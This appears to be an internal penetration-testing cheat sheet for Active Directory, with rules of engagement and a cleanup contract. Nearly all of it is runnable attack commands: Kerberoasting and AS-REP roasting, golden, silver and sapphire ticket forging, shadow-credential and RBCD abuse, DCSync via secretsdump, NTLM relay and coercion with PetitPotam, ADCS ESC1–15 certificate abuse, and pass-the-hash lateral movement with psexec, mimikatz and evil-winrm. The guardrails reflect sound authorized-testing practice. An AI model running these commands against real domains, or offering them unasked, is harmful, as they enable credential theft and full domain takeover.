# Active Directory command reference (shared by the AD variants)
# Internal / assumed-breach. AUTHORIZED foothold REQUIRED. Exploitation is APPROVAL-GATED.
# Golden rules: crack OFFLINE · demonstrate the VECTOR/capability (not full domain takeover) · single
# test account for DCSync · no golden-ticket persistence · clean up created objects · no prod-disruptive
# coercion. Placeholders: <d>=domain <u>/<p>=creds <dc>=DC ip/host <ca>=CA <t>=target <h>=NT hash.
# (Exact invocations adapted from the user's 0daysec Windows/AD notes — the windows-ad-pentest mindmap.)

═══════════════════════════════════════════════════════════════════════════
## ad-context — enumeration feeder
═══════════════════════════════════════════════════════════════════════════
```
# BloodHound collection
bloodhound-python -d <d> -u <u> -p <p> -c All -ns <dc> --zip
SharpHound.exe --CollectionMethods All --Domain <d> --ExcludeDCs
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bh --autosplit --threshold 900   # stealth via ADWS
# NetExec sweep
nxc smb <dc> --users --groups --pass-pol --shares        nxc smb <range> --rid-brute 10000
nxc smb <range> -u '' -p ''    (null)     nxc smb <range> -u 'a' -p ''   (anon)
nxc ldap <dc> -u <u> -p <p> -M get-desc-users            # descriptions (find MSOL / passwords in desc)
# PowerView / AD module
Get-DomainUser -SPN ; Get-DomainUser -AdminCount ; Get-DomainGroup "*admin*"
Get-ADUser -Filter * -Properties * ; Get-ADGroupMember "Domain Admins" ; Get-ADComputer -Filter *
# ldeep full dump + subcommands (trusts/templates/gmsa/laps/pso/sccm)
ldeep ldap -u <u> -p <p> -d <d> -s ldap://<dc> all <outdir>
# Anonymous / pre-cred
rpcclient -U "" <dc> -N -c 'enumdomusers;getdompwinfo'   ;   enum4linux-ng -A <dc> -oA out
ldapsearch -x -H ldap://<dc> -b "dc=..,dc=.." "(objectClass=person)"
kerbrute userenum -d <d> --dc <dc> users.txt            # valid users, no lockout
# Find the DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.<d>   ;   nmap -p 88 --open <range>
# Roastable users in BloodHound (excl gMSA/MSA/krbtgt):
#   MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true AND NOT u.objectid ENDS WITH '-502'
#     AND NOT COALESCE(u.gmsa,false)=true AND NOT COALESCE(u.msa,false)=true RETURN u
```

═══════════════════════════════════════════════════════════════════════════
## ad-kerberos — roast / delegation / tickets  (crack OFFLINE; capability-only)
═══════════════════════════════════════════════════════════════════════════
```
# AS-REP roast (no creds needed for the roast itself)
GetNPUsers.py <d>/ -dc-ip <dc> -usersfile users.txt -format hashcat -no-pass -outputfile asrep.txt
nxc ldap <dc> -u users.txt -p '' --asreproast asrep.txt     Rubeus.exe asreproast /format:hashcat
# Kerberoast
GetUserSPNs.py -request -dc-ip <dc> <d>/<u>:<p>             Rubeus.exe kerberoast
#   blind/no-preauth Kerberoast (needs an AS-REP-roastable user, no creds):
Rubeus.exe kerberoast /nopreauth:<asrep_user> /spns:users.txt /domain:<d> /dc:<dc>
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile users.txt -dc-host <dc> <d>/
# TimeRoasting (no creds — computer-account hashes via NTP MS extension)
timeroast.py <dc> -o roast.log        # $sntp-ms$ -> hashcat -m 31300
# Delegation
findDelegation.py "<d>"/"<u>":"<p>"
#   constrained S4U (impersonate a test admin to a test service):
getST.py -spn cifs/<t> -hashes ':<h>' '<d>/<constrained>$' -impersonate Administrator -dc-ip <dc>
Rubeus.exe s4u /ticket:<t> /impersonateuser:Administrator /msdsspn:<spn> /altservice:<alt> /ptt
#   unconstrained (capture a TGT — demonstrate, don't hoard):
mimikatz "privilege::debug" "sekurlsa::tickets /export"   ;   Rubeus.exe monitor /interval:5
# Tickets (CAPABILITY ONLY — forge for a TEST principal, do not persist)
ticketer.py -aesKey <krbtgt_aes> -domain-sid <sid> -domain <d> <testuser>          # golden
ticketer.py -request -impersonate <u> -domain <d> -user <u> -password <p> -nthash <h> \
            -aesKey <k> -domain-sid <sid> 'ignored'                                  # Sapphire (blends in)
ticketer.py -nthash <machine_nt> -domain-sid <sid> -domain <d> <testuser>           # silver
# Crack modes: TGS-RC4 13100 · TGS-AES128 19600 · TGS-AES256 19700 · AS-REP 18200 · MsCache2 2100 · TimeRoast 31300
```

═══════════════════════════════════════════════════════════════════════════
## ad-acl-abuse — exercise ONE edge on a test principal, then REVERT
═══════════════════════════════════════════════════════════════════════════
```
net group "<group>" <myuser> /add /domain                               # AddMember
# Shadow Credentials (msDS-KeyCredentialLink) -> PKINIT -> NT hash
certipy shadow auto -u '<u>@<d>' -p <p> -account '<target>'
pywhisker.py -d <d> -u <u> -p <p> --target <TARGET_SAM> --action add    # (list/remove to clean up)
targetedKerberoast.py -d <d> -u <u> -p <p>                              # GenericWrite -> set SPN -> roast
# RBCD (needs only GenericWrite/GenericAll on the computer — NO DA):
addcomputer.py -computer-name 'ATTACKSYS$' -computer-pass 'Pwned123!' -dc-host <dc> -domain-netbios <NB> '<d>/<u>:<p>'
rbcd.py -dc-ip <dc> -delegate-from 'ATTACKSYS$' -delegate-to '<victim>$' -action write '<d>/<u>:<p>'
getST.py -spn cifs/<victim> -impersonate Administrator '<d>/ATTACKSYS$:Pwned123!'
# DCSync — SINGLE test account only (not the whole domain)
secretsdump.py -just-dc-user '<d>\<testadmin>' <d>/<u>:<p>@<dc>
# Relay -> LDAP ACL escalation
ntlmrelayx.py -t ldaps://<dc> --remove-mic -smb2support --escalate-user <u>
ntlmrelayx.py -t ldaps://<dc> --shadow-credentials --shadow-target '<dc>$'      # or --delegate-access
# Read secrets you're entitled to
Find-AdmPwdExtendedRights -Identity <OU> ; nxc ldap <dc> -u <u> -p <p> --module laps   # LAPS
gMSADumper.py -u <u> -p <p> -d <d>  ;  nxc ldap <dc> -u <u> -p <p> --gmsa              # gMSA
```

═══════════════════════════════════════════════════════════════════════════
## ad-adcs — ESC1-15 (issue a cert as a test principal, then REVOKE)
═══════════════════════════════════════════════════════════════════════════
```
certipy find -u <u>@<d> -p <p> -dc-ip <dc>                               # enumerate templates + ESC flags
# ESC1 (SAN):   certipy req -u <u>@<d> -p <p> -target <ca_srv> -template '<tpl>' -ca <ca> -upn Administrator@<d>
# ESC2/3:       enrollment-agent template -> certipy req ... -on-behalf-of '<d>\<user>' -pfx <cert>
# ESC4:         certipy template -u.. -template <t> -save-old  (write template -> ESC1 -> restore -configuration <t>.json)
# ESC6:         EDITF_ATTRIBUTESUBJECTALTNAME2 set -> behaves like ESC1
# ESC7:         certipy ca -ca <ca> -add-officer '<u>' ; -enable-template '<esc1tpl>' ; -issue-request <id> ; req -retrieve <id>
# ESC8:         ntlmrelayx.py -t http://<dc>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# ESC9/10:      certipy shadow auto -username A@d -p passA -account B ; account update -user B -upn Administrator ; req as B ; reset UPN
# ESC11:        ntlmrelayx.py -t rpc://<ca> -smb2support -rpc-mode ICPR -icpr-ca-name <ca>   (no web enroll)
# ESC13/15:     certipy req ... --application-policies 'Client Authentication' | 'Certificate Request Agent'
# Certifried CVE-2022-26923:  certipy account create -user certipc -pass <p> -dns <dc_fqdn> ; req -template Machine ; auth -> DCSync
# Pass-the-Certificate:  certipy auth -pfx <pfx> -dc-ip <dc>   (pfx -> NT hash) ; gettgtpkinit.py / Rubeus asktgt /certificate:
# masky -d <d> -u <u> -p <p> -ca <ca> <ip>        # cert-based cred dump (NT/ccache/pfx)
# certsync -u <u> -p <p> -d <d> -dc-ip <dc> -ns <ns>    # dump NTDS with NO DA via ADCS
# Golden Certificate (CA key theft -> forge):  certipy ca -backup -ca '<ca>' ... ; certipy forge -ca-pfx <ca_key> -upn <u>@<d>
```

═══════════════════════════════════════════════════════════════════════════
## ad-lateral-movement — authenticate to ANOTHER in-scope host (benign cmd), then clean up
═══════════════════════════════════════════════════════════════════════════
```
nxc smb <t> -u <u> -p <p> -d <d>                 # look for (Pwn3d!) = local admin
# Remote-exec matrix (pick by noise):
#   wmiexec.py  = DCOM Win32_Process.Create (no service, no disk)
#   smbexec.py  = service cmd.exe /c          (Event 7045, no binary on disk)
#   atexec.py   = scheduled task              (Event 4698)
#   psexec.py   = ADMIN$ service, SYSTEM shell (Event 7045/4697)
#   dcomexec.py = MMC20/ShellWindows
nxc smb <t> -u <u> -p <p> -x 'whoami'            # or -X '<ps>'
# Pass-the-Hash
nxc smb <range> -u Administrator -H <h> --local-auth       psexec.py -hashes :<h> Administrator@<t>
evil-winrm -i <t> -u Administrator -H <h>
mimikatz "token::revert" "sekurlsa::pth /user:<u> /domain:<d> /ntlm:<h> /run:cmd"   # token::revert FIRST
# Pass/Overpass-the-Ticket / Pass-the-Key
export KRB5CCNAME=/path.ccache ; <impacket> -k -no-pass       Rubeus.exe ptt /ticket:<t>
getTGT.py <d>/<u> -hashes :<h>                   Rubeus.exe asktgt /user:<u> /domain:<d> /aes256:<k>
# runas credential injection (stealthy); hostname path = Kerberos, IP path = forced NTLM
runas.exe /netonly /user:<d>\<u> cmd.exe
xfreerdp /v:<t> /u:<d>\<u> /pth:<h>              # PtH over RDP
# NTLM relay + coercion (approval; non-disruptive)
nxc smb <range> --gen-relay-list unsigned.txt
ntlmrelayx.py -tf unsigned.txt -smb2support -socks
printerbug.py <d>/<u>:<p>@<printer> <listener>  ;  petitpotam.py -d <d> -u <u> -p <p> <listener> <t>
coercer.py -d <d> -u <u> -p <p> -t <t> -l <ip>
```

## Cleanup contract (every AD run)
Record in `cleanup.md` and REVERT: added group members, shadow-cred key links (`pywhisker --action remove`),
created computer accounts (ATTACKSYS$), RBCD writes (`rbcd.py -action flush`), issued certs (revoke via CA),
tickets/ccaches, enabled templates/officers (ESC7 — disable/remove). No golden-ticket persistence; no
whole-domain NTDS dump; single test account for DCSync.
